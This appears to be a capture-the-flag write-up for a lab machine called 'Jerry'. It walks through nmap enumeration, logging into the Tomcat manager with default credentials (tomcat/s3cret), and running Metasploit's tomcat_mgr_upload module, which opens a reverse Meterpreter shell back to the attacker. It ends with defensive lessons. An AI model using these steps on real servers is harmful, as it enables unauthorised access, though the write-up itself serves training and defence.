---
title: Jerry
description: Apache Tomcat with default credentials on the manager panel. Upload a malicious WAR file via Metasploit, get a shell as SYSTEM.
---

# Jerry

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Windows Server 2012 R2 |
| **Focus** | Apache Tomcat default credentials + WAR file upload |

Jerry is one of the most straightforward boxes on the platform — and one of the most instructive.
Apache Tomcat is everywhere in enterprise environments, often running with weak or default credentials on the manager interface.
That interface can deploy WAR files. WAR files can be web shells or reverse shells.
The chain is three steps: find the panel, authenticate, deploy code.

Running as SYSTEM from the start means no privilege escalation needed.

---

## Setup

Kali VM via QEMU. VPN config transferred from host via HTTP server, connected with openvpn.
If large packets time out, lower the MTU on the tunnel interface:

```bash
sudo ip link set tun0 mtu 1200
```

---

## Enumeration

```bash
nmap -sC -vv -oA nmap_init <IP>
```

**Results:**

| Port | Service | Detail |
|------|---------|--------|
| 8080 | http | Apache Tomcat/7.0.88 |

Single attack surface. The nmap favicon script confirms Tomcat immediately — version 7.0.88 visible in the page title.

TTL of 127 in the response confirms Windows (Windows starts at 128, one hop down = 127).

---

## Web Application — Tomcat Manager

Navigating to `http://<IP>:8080` shows the default Tomcat landing page, which confirms the version.

The manager interface is a known default path — no fuzzing needed:

```
http://<IP>:8080/manager/html
```

This prompts HTTP Basic Authentication.

---

## Credential Discovery

Tried the standard Tomcat 7 default credentials:

```
tomcat / s3cret
```

Worked immediately. Inside the Tomcat Manager application list and deploy panel.

---

## Exploitation — Metasploit WAR Upload

Used the Metasploit module for authenticated Tomcat manager WAR upload:

```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOST <IP>
set RPORT 8080
set LHOST <tun0-IP>
set HttpUsername tomcat
set HttpPassword s3cret
exploit
```

Metasploit uploads the WAR, triggers execution, then automatically undeploys it.
A Meterpreter session opens.

```
[*] Meterpreter session 1 opened
```

---

## Shell & Flags

Dropped from Meterpreter into a Windows shell:

```
meterpreter > shell
```

Jerry puts both flags in a single file — no separate user flag path:

```cmd
cd C:\Users\Administrator\Desktop\flags
type "2 for the price of 1.txt"
```

The filename has spaces — double quotes required in Windows CMD.

**User flag:** `<!-- insert here -->`

**Root flag:** `<!-- insert here -->`

---

!!! example "Conclusion"
    Jerry lands you directly as SYSTEM — Tomcat was running with full administrator privileges, so there is no privilege escalation step at all. The entire attack chain is: identify the app from nmap → navigate to the known default manager path → try one pair of default credentials → deploy a payload through the legitimate manager interface.

    The blue team lesson is sharp: Tomcat's manager should never be internet-facing, default credentials must be rotated on install, and the service account running Tomcat should have the minimum privileges needed — not SYSTEM. In a real environment, a single `tomcat/s3cret` login to `/manager/html` is game over for the whole host.
